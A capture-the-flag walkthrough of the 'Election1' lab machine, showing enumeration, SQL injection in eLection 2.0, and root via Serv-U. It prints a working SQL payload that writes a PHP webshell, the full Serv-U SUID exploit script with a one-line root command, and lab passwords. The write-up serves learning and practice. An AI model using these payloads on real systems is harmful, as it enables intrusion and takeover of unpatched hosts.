# Election1

## Background

>  Who is the best candidate for the role?  

- Author: Love Sharma

- Released on: Jun 30, 2022

- Difficulty: Intermediate

> Overall difficulty for me: Easy

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a1.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a2.png)

According to `rustscan` result, we have 2 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | Apache httpd 2.4.29

## HTTP on Port 80

**robots.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a3.png)

Found a wordlist?? Let's brute forcing hidden directory via `gobuster`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a4.png)

Found `election` directory:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a5.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a6.png)

It has a `admin` directory!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a7.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a8.png)

At this moment, I stuck at here for a while, and I decided to enumerate the `/election` directory via `gobuster` again but with different wordlist:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a11.png)

The `card.php` Looks interesting:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a12.png)

Bunch of binary. Let's convert binary to ascii via [CyberChef](https://gchq.github.io/CyberChef):

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a13.png)

Found a username and password!

- Username:1234
- Password:Zxc123!@#

Login to the `/admin` page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a9.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a10.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a14.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a15.png)

We're admin in this page!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a16.png)

By enumerating manually, we can find that this page is using `eLection Arctic Fox 2.0`! Let's use `searchsploit` to find public exploit!

**Searchsploit Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a17.png)

Looks like it suffers to SQL Injection!

# Initial Foothold

> After I rooted this machine, I found that there are 2 ways to gain initial foothold. In below I'll do the harder one, because why not try harder? :D

**48122.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a18.png)

Yep, we're authenticated, and we should good to go!

> Since I'm practicing the OSCP exam environment, instead of using SQLmap to gain initial foothold, I'll do it manually, as SQLmap is prohibited in OSCP exam.

1. Capture the POST request:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a19.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a20.png)

**Send to `Repeater`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a21.png)

Confirm it's really vulnerable to SQL Injection:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a22.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a23.png)

**Confirmed it's vulnerable to Union-based SQL Injection.**

Let's test we can **load** a file or not via `load_file` in MySQL:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a24.png)

Yes!! Can we **write** into a file too?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a25.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a26.png)

**Wow!! We can! We can now write a PHP webshell into `/var/www/html`!**

**Complete POST request:**
```sql
aksi=fetch&id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,"<?php system($_GET['cmd']) ?>" into outfile '/var/www/html/webshell.php'
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a27.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a28.png)

We now have RCE (Remote Code Execution)!

**Reverse Shell:**

Since the target machine has `nc` installed, I'll use `nc` reverse shell from [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), and URL encode it, as `curl` needs URL encoding:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a45.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a29.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a30.png)

**Stable Shell via `socat`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a31.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a32.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a33.png)

**local.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a35.png)

# Privilege Escalation

## www-data to love

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a34.png)

Found 1 user: `love`

**LinPEAS Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a36.png)

**Found MySQL creds:**

- Username:root
- Password:toor

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a37.png)

**Found group writable `/var/spool/cron/crontabs`.** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a38.png)

**Found user `love` password:**

- Username:love
- Password:P@$$w0rd@123

**Also found `/usr/local/Serv-U/Serv-U` has SUID bit set:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a39.png)

**Switch User to `love`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a40.png)

## www-data/love to root

**Serv-U SUID:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a41.png)

Found `Serv-U File Server Version 15.1.6.25`.

**Searchsploit Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a42.png)

Looks like we can leverage the `Serv-U` SUID binary to escalate to root!

**47173.sh:**
```bash
if ! test -u "/usr/local/Serv-U/Serv-U"; then
  echo '[-] /usr/local/Serv-U/Serv-U is not setuid root'
  exit 1
fi

echo "[*] Launching Serv-U ..."

/bin/bash -c 'exec -a "\";cp /bin/bash /tmp/sh; chown root /tmp/sh; chmod u+sx /tmp/sh;\"" /usr/local/Serv-U/Serv-U -prepareinstallation'

if ! test -u "/tmp/sh"; then
  echo '[-] Failed'
  /bin/rm "/tmp/sh"
  exit 1
fi

echo '[+] Success:'
/bin/ls -la /tmp/sh

echo "[*] Launching root shell: /tmp/sh"
/tmp/sh -p
```

In the above Bash exploit script, it has the following things:

1. Line 1-4:

- Checking the `/usr/local/Serv-U/Serv-U` has SUID bit set or not. If not, exit the script.

2. Line 8: (Exploit part)

- If the binary has SUID bit set, it'll first launch the `Serv-U` binary with `-prepareinstallation` option, then copy `/bin/bash` to `/tmp/sh`, change the owner of `/tmp/sh` to root, set SUID bit set and executable to `/tmp/sh`.

3. Line 10-14:

- If there is no `/tmp/sh` file, then exit the script, and echo the exploit has failed.

4. Line 16-20:

- If the `/tmp/sh` successfully copied, then it'll launch a root shell.

**We can just copy the exploit part and manually launch the root shell!**

**Exploit command:**
```bash
/bin/bash -c 'exec -a "\";cp /bin/bash /tmp/sh; chown root /tmp/sh; chmod u+sx /tmp/sh;\"" /usr/local/Serv-U/Serv-U -prepareinstallation'
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a43.png)

And we're root! :D

# Rooted

**proof.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/Election1/images/a44.png)

# Conclusion

What we've learned:

1. Web Crawler (`robots.txt`)
2. Directory Enumeration
3. Binary to ASCII
4. MySQL Union-Based SQL Injection to RCE
5. Privilege Escalation via Reused Password
6. Privilege Escalation via Vulnerable Serv-U FTP Server